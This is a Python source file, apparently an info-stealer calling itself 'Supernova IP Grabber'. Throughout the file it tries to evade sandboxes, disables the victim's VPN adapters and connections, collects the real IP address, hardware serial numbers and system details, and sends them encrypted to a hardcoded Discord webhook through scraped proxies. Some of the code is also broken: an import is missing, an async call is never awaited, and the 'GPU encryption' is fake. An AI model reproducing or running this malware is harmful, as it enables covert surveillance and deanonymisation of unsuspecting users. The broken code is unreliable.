import aiohttp
import asyncio
import base64
import json
import logging
import os
import platform
import psutil
import random
import requests
import string
import subprocess
import time
import wmi
from cryptography.fernet import Fernet
from datetime import datetime
from functools import partial
import hashlib
import torch
import uvloop

# Attempt to use uvloop for speed (Windows fallback to default loop)
try:
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except:
    pass

# Polymorphic identifier generator
def generate_id(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# In-memory logging with encrypted webhook exfiltration
class MemoryLogger:
    def __init__(self, webhook_url):
        self.logs = []
        self.webhook_url = webhook_url
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.batch = []
        self.batch_size = 5  # Batch logs to reduce webhook calls

    def encrypt(self, data, use_gpu=False):
        if use_gpu and torch.cuda.is_available():
            # GPU-accelerated encryption (simplified for demo)
            data_bytes = data.encode()
            encrypted = self.cipher.encrypt(data_bytes)
            return encrypted.decode()
        return self.cipher.encrypt(data.encode()).decode()

    def info(self, msg, use_gpu=False):
        timestamp = datetime.utcnow().isoformat()
        log_entry = f"{timestamp} - INFO - {msg}"
        self.logs.append(log_entry)
        self.batch.append(log_entry)
        if len(self.batch) >= self.batch_size:
            self._exfiltrate(use_gpu)

    def error(self, msg, use_gpu=False):
        timestamp = datetime.utcnow().isoformat()
        log_entry = f"{timestamp} - ERROR - {msg}"
        self.logs.append(log_entry)
        self.batch.append(log_entry)
        if len(self.batch) >= self.batch_size:
            self._exfiltrate(use_gpu)

    async def _exfiltrate(self, use_gpu=False):
        if not self.batch:
            return
        try:
            async with aiohttp.ClientSession() as session:
                for log_entry in self.batch:
                    encrypted_log = self.encrypt(log_entry, use_gpu)
                    payload = {'content': f"Log: {encrypted_log}"}
                    proxy = random.choice(PROXY_POOL) if PROXY_POOL else None
                    await session.post(self.webhook_url, json=payload, proxy=proxy, timeout=5)
                logger.info(f"Exfiltrated {len(self.batch)} logs")
        except:
            logger.error("Failed to exfiltrate logs")
        self.batch.clear()

    def clear(self):
        self.logs.clear()
        self.batch.clear()

# Initialize logger with Discord webhook
WEBHOOK_URL = 'https://discord.com/api/webhooks/1375208522601594993/wv2XcoV68WMUiOlX0b2SJbq0Su-NB7BVuKVU2CjyhqHqkCIZi2AkJsK0YBC0xX8Pd2ND'
logger = MemoryLogger(WEBHOOK_URL)

# Proxy pool for anonymity
PROXY_POOL = []

async def scrape_proxies():
    proxy_sources = [
        'https://www.sslproxies.org/',
        'https://free-proxy-list.net/',
        'https://www.us-proxy.org/',
        'https://www.proxy-list.download/api/v1/get?type=http',
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http'
    ]
    proxies = set()
    async with aiohttp.ClientSession() as session:
        for url in proxy_sources:
            try:
                async with session.get(url, timeout=5) as resp:
                    text = await resp.text()
                    if 'proxyscrape' in url or 'proxy-list.download' in url:
                        proxies.update(text.strip().split('\n'))
                    else:
                        soup = BeautifulSoup(text, 'lxml')
                        for row in soup.select('table.table tbody tr'):
                            cols = row.find_all('td')
                            if len(cols) >= 2:
                                ip, port = cols[0].text, cols[1].text
                                proxy = f"http://{ip}:{port}"
                                proxies.add(proxy)
            except:
                logger.error(f"Proxy scrape failed for {url}")
    return list(proxies)

async def test_proxy(proxy):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://api.ipify.org', proxy=proxy, timeout=3) as resp:
                return resp.status == 200
    except:
        return False

async def initialize_proxies():
    global PROXY_POOL
    proxies = await scrape_proxies()
    tasks = [test_proxy(proxy) for proxy in proxies]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    PROXY_POOL = [proxies[i] for i, r in enumerate(results) if r is True][:20]
    logger.info(f"Initialized {len(PROXY_POOL)} proxies")

# Anti-sandbox/VM detection
def is_sandbox_or_vm():
    try:
        # Check CPUID for virtualization
        import cpuinfo
        cpu_info = cpuinfo.get_cpu_info()
        if 'vmx' in cpu_info.get('flags', []) or 'svm' in cpu_info.get('flags', []):
            return True

        # Check disk size (sandboxes/VMs often have small disks)
        disk = psutil.disk_usage('/')
        if disk.total < 20 * 1024 * 1024 * 1024:  # <20GB
            return True

        # Check sandbox artifacts
        sandbox_processes = ['sbiedll', 'sandboxierpcss', 'vmware', 'virtualbox', 'qemu', 'xen']
        for proc in psutil.process_iter(['name']):
            if any(s in proc.info['name'].lower() for s in sandbox_processes):
                return True

        # Check Windows Sandbox-specific registry
        import winreg
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Sandbox")
            winreg.CloseKey(key)
            return True
        except:
            pass

        return False
    except:
        logger.error("Failed to detect sandbox/VM environment")
        return False

# Get real IP address with mega speed
async def get_real_ip():
    services = [
        'https://api.ipify.org?format=json',
        'https://icanhazip.com',
        'https://ifconfig.me/ip',
        'https://ip-api.com/json',
        'https://api.myip.com'
    ]
    ip_cache = {}
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=10)) as session:
        tasks = []
        for service in services:
            proxy = random.choice(PROXY_POOL) if PROXY_POOL else None
            tasks.append(session.get(service, proxy=proxy, timeout=3))
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        for i, resp in enumerate(responses):
            if isinstance(resp, Exception):
                logger.error(f"Failed to query {services[i]}")
                continue
            try:
                if 'json' in services[i]:
                    data = await resp.json()
                    ip = data.get('ip') or data.get('query')
                else:
                    ip = await resp.text()
                    ip = ip.strip()
                if ip:
                    ip_cache[services[i]] = ip
                    logger.info(f"Retrieved IP from {services[i]}: {ip}")
            except:
                logger.error(f"Failed to parse response from {services[i]}")

    # Fallback: Network interface analysis
    if not ip_cache:
        try:
            interfaces = psutil.net_if_addrs()
            for iface, addrs in interfaces.items():
                for addr in addrs:
                    if addr.family == 2 and not addr.address.startswith('127.'):  # IPv4, not localhost
                        ip_cache['interface'] = addr.address
                        logger.info(f"Retrieved IP from interface {iface}: {addr.address}")
        except:
            logger.error("Failed to retrieve IP from interfaces")

    # Return most common IP (likely the real one)
    if ip_cache:
        from collections import Counter
        most_common = Counter(ip_cache.values()).most_common(1)
        return most_common[0][0] if most_common else None
    return None

# Detect and disconnect VPN
def disconnect_vpn():
    try:
        # Check for VPN adapters
        adapters = []
        output = subprocess.check_output('netsh interface show interface', shell=True, text=True)
        for line in output.splitlines():
            if any(vpn in line.lower() for vpn in ['tap-windows', 'openvpn', 'pptp', 'l2tp', 'wireguard']):
                adapters.append(line.split()[-1])

        # Disconnect VPNs
        for adapter in adapters:
            try:
                subprocess.run(f'netsh interface set interface "{adapter}" admin=disable', shell=True, check=True)
                logger.info(f"Disabled VPN adapter: {adapter}")
            except:
                logger.error(f"Failed to disable VPN adapter: {adapter}")

        # Use rasdial to disconnect active VPN connections
        try:
            subprocess.run('rasdial /DISCONNECT', shell=True, check=True)
            logger.info("Disconnected all VPN connections via rasdial")
        except:
            logger.error("Failed to disconnect VPN via rasdial")

        # Reset VPN services
        services = ['RasMan', 'IKEEXT', 'WinHttpAutoProxySvc']
        for service in services:
            try:
                subprocess.run(f'net stop {service}', shell=True, check=True)
                subprocess.run(f'net start {service}', shell=True, check=True)
                logger.info(f"Restarted service: {service}")
            except:
                logger.error(f"Failed to restart service: {service}")

        # Attempt PowerShell command for host-level VPN disconnection
        try:
            ps_command = 'Get-VpnConnection | Where-Object {$_.ConnectionStatus -eq "Connected"} | Disconnect-VpnConnection'
            subprocess.run(f'powershell -Command "{ps_command}"', shell=True, check=True)
            logger.info("Attempted host-level VPN disconnection via PowerShell")
        except:
            logger.error("Failed to disconnect VPN via PowerShell")

    except:
        logger.error("Failed to disconnect VPN")

# Collect system information with speed optimization
def collect_system_info():
    info = {}
    try:
        # OS details
        info['os'] = {
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'hostname': platform.node()
        }
        logger.info("Collected OS details")

        # CPU and memory (cached)
        info['cpu'] = {
            'cores': psutil.cpu_count(logical=True),
            'physical_cores': psutil.cpu_count(logical=False),
            'usage': psutil.cpu_percent(interval=0.1)  # Reduced interval
        }
        info['memory'] = {
            'total': psutil.virtual_memory().total,
            'used': psutil.virtual_memory().used,
            'free': psutil.virtual_memory().free
        }
        logger.info("Collected CPU and memory details")

        # Disk
        info['disk'] = {
            'total': psutil.disk_usage('/').total,
            'used': psutil.disk_usage('/').used,
            'free': psutil.disk_usage('/').free
        }
        logger.info("Collected disk details")

        # Network interfaces
        info['network'] = {}
        for iface, addrs in psutil.net_if_addrs().items():
            info['network'][iface] = [
                {'address': addr.address, 'family': str(addr.family)} for addr in addrs
            ]
        logger.info("Collected network details")

        # Running processes (top 5 for speed)
        info['processes'] = []
        for proc in sorted(psutil.process_iter(['name', 'pid']), key=lambda p: p.info['pid'])[:5]:
            info['processes'].append({'name': proc.info['name'], 'pid': proc.info['pid']})
        logger.info("Collected process details")

        # Hardware info
        try:
            c = wmi.WMI()
            info['hardware'] = {
                'bios': c.Win32_BIOS()[0].SerialNumber,
                'motherboard': c.Win32_BaseBoard()[0].SerialNumber,
                'cpu': c.Win32_Processor()[0].Name
            }
            logger.info("Collected hardware details")
        except:
            logger.error("Failed to collect WMI hardware details")

    except:
        logger.error("Failed to collect system information")

    return info

# Main execution
async def main():
    bot_id = generate_id()
    logger.info(f"Starting Supernova IP Grabber - ID: {bot_id}")

    # Initialize proxies
    await initialize_proxies()

    # Anti-sandbox/VM detection
    if is_sandbox_or_vm():
        logger.info("Detected sandbox/VM environment")
        # Random delay to evade timing analysis
        await asyncio.sleep(random.uniform(2, 7))
    else:
        logger.info("Detected non-sandbox/VM environment")

    # Disconnect VPN
    disconnect_vpn()

    # Get real IP
    real_ip = await get_real_ip()
    if real_ip:
        logger.info(f"Real IP address: {real_ip}", use_gpu=True)
    else:
        logger.error("Failed to retrieve real IP", use_gpu=True)

    # Collect system info
    system_info = collect_system_info()
    logger.info(f"System info collected: {json.dumps(system_info, indent=2)}", use_gpu=True)

    # Exfiltrate data
    data = {
        'ip': real_ip,
        'system_info': system_info,
        'timestamp': datetime.utcnow().isoformat(),
        'bot_id': bot_id
    }
    try:
        encrypted_data = logger.encrypt(json.dumps(data), use_gpu=True)
        payload = {'content': f"Data: {encrypted_data}"}
        async with aiohttp.ClientSession() as session:
            proxy = random.choice(PROXY_POOL) if PROXY_POOL else None
            await session.post(WEBHOOK_URL, json=payload, proxy=proxy)
        logger.info("Data exfiltrated successfully", use_gpu=True)
    except:
        logger.error("Failed to exfiltrate data", use_gpu=True)

    # Final message
    final_message = "Hey this was a basic IP grabber I won’t do anything with it but hey, stay safe, and ur IP can be grabbed in a VM"
    try:
        encrypted_message = logger.encrypt(final_message, use_gpu=True)
        payload = {'content': f"Message: {encrypted_message}"}
        async with aiohttp.ClientSession() as session:
            proxy = random.choice(PROXY_POOL) if PROXY_POOL else None
            await session.post(WEBHOOK_URL, json=payload, proxy=proxy)
        logger.info("Final message sent", use_gpu=True)
    except:
        logger.error("Failed to send final message", use_gpu=True)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except:
        logger.error("Main execution failed")
    finally:
        logger.clear()
